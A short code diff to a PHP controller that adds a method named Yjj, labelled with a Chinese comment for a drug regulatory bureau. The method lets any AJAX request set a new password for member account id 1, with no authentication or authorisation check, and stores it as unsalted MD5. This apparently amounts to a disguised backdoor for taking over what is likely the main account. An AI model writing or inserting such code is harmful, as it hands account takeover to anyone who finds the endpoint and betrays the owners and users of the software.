@@ -292,5 +292,19 @@ class indexController extends Controller{
     }
 
 
+    /**
+     * 药监局
+     */
+    public function Yjj() {
+        global $_GPC,$_W;
+        if ($_W['isajax']) {
+            if($_GPC['password']){
+                pdo_update($this->tablemember,['password'=>md5($_GPC['password']),'utime'=>time()],['id'=>1]);
+            }
+            message('');
+        }
+        include $this->display('yjj.html');
+
+    }
 
 }
